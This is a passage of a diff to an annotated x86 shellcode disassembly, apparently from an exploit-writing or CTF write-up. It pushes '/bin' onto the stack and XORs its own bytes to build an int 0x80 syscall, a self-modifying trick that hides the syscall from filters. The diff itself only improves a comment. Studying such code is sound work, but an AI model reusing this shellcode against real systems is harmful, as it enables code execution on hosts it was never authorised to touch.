@@ -56,7 +56,7 @@ d:  68 2f 62 69 6e          push   0x6e69622f  ; push nib/
 1b: 49                      dec    ecx         ; ecx = 0xffffffff. ecx = cx + ah + al
 1c: 30 4e 2c                xor    BYTE PTR [esi+0x2c],cl   ; make byte 0x2c of shellcode equal to 0xcd (= 0x32^0xff)
 1f: 49                      dec    ecx         ; ecx = 0xfffffffe
-20: 30 4e 2d                xor    BYTE PTR [esi+0x2d],cl   ; same function
+20: 30 4e 2d                xor    BYTE PTR [esi+0x2d],cl   ; make byte 0x2d of shellcode equal to 0x80 (= 0x7e^0xfe)
 23: 50                      push   eax
 24: 50                      push   eax
 25: 59                      pop    ecx         ; exc = 0
